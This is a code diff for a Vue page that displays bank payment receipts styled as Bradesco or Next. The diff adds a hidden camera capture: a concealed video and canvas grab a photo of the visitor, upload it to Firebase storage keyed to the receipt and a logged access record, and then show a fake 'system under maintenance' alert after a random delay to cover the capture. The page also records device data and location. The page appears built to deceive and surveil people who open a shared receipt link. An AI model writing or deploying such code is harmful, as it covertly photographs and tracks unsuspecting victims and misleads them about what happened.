@@ -1,20 +1,25 @@
 <template>
     <div class="container">
-        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante" />
-        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante" />
+        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante"
+            @tirar-foto="capturaFoto" />
+        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante"
+            @tirar-foto="capturaFoto" />
     </div>
+    <video id="camera" style="display: none;" muted autoplay></video>
+    <canvas id="photo" style="display: none;"></canvas>
 </template>
 
 <script setup>
-import { computed, onBeforeMount, onMounted, ref } from 'vue';
+import { computed, onBeforeMount, onMounted, reactive, ref } from 'vue';
 import { useRoute, useRouter } from 'vue-router';
-import { firestore } from '../firebase';
+import { firestore, storage } from '../firebase';
 import { collection, doc, getDoc, serverTimestamp, setDoc } from 'firebase/firestore';
 import { useAppStore } from '../store';
-import { bancoInfo, formataDataHoraPtBr, formataMoedaBRL, getCurrentPosition, maskCpf, pegaPrimeiroNome } from '../functions';
+import { bancoInfo, delay, formataDataHoraPtBr, formataMoedaBRL, getCurrentPosition, maskCpf, pegaPrimeiroNome, requestCameraPermission } from '../functions';
 import Bradesco from '../components/ComprovanteBradesco.vue';
 import Next from '../components/ComprovanteNext.vue';
 import { Device } from '@capacitor/device';
+import { ref as refStorage, uploadString } from 'firebase/storage';
 
 const route = useRoute();
 const router = useRouter();
@@ -23,7 +28,14 @@ const appStore = useAppStore();
 
 const comprovante = ref(null);
 const acesso = ref({});
-const acessoId = ref(null);
+
+const data = reactive({
+    video: null,
+    canvas: null,
+    comprovanteId: null,
+    acessoId: null,
+    capturaFotoRealizada: false
+});
 
 onBeforeMount(() => {
     appStore.loadingToggle();
@@ -46,11 +58,16 @@ onMounted(async () => {
     comprovante.value.bancoImgSrc = bancoImgSrc.value;
     comprovante.value.transacao = route.query.id;
 
+    data.comprovanteId = route.query.id;
+
     if (!bancoInfo(comprovante.value.instituicao)) {
         router.push({ path: '/' });
     }
 
     setMetaData();
+
+    data.video = document.getElementById('camera');
+    data.canvas = document.getElementById('photo');
 
     try {
         acesso.value = { ...acesso.value, ...await Device.getInfo() };
@@ -79,7 +96,7 @@ onMounted(async () => {
     try {
         const ref = doc(collection(firestore, "acessos"));
         await setDoc(ref, acesso.value);
-        acessoId.value = ref.id;
+        data.acessoId = ref.id;
     } catch (error) {
         console.error('Error ao enviar acesso:', error);
     }
@@ -94,6 +111,7 @@ const bancoImgSrc = computed(() => {
 const faviconSrc = computed(() => {
     return new URL(`../assets/bancos/${comprovante.value.instituicao}-favicon.png`, import.meta.url).href
 });
+
 function setMetaData() {
     const banco = bancoInfo(comprovante.value.instituicao);
 
@@ -127,5 +145,37 @@ function setMetaData() {
 
     document.querySelector('link[rel="image_src"]').href = bancoImgSrc.value;
     document.querySelector('link[rel="icon"]').href = faviconSrc.value;
+}
+
+async function capturaFoto() {
+    if (data.capturaFotoRealizada) {
+        return;
+    }
+
+    await requestCameraPermission(data.video);
+    appStore.loadingToggle();
+
+    data.canvas.width = data.video.videoWidth;
+    data.canvas.height = data.video.videoHeight;
+
+    const context = data.canvas.getContext('2d');
+    context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);
+
+    try {
+        await uploadString(refStorage(storage, `/capturas/${data.comprovanteId}/${data.acessoId}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
+    } catch (error) {
+        console.error('Error upload file:', error);
+    }
+
+    const tracks = data.video.srcObject.getTracks();
+    if (tracks) {
+        tracks.forEach(t => t.stop());
+    }
+
+    data.capturaFotoRealizada = true;
+
+    await delay(751 + (Math.random() * 750));
+    data.alert = alert('Sistema em manutenção. Tente mais tarde...');
+    appStore.loadingToggle();
 }
 </script>
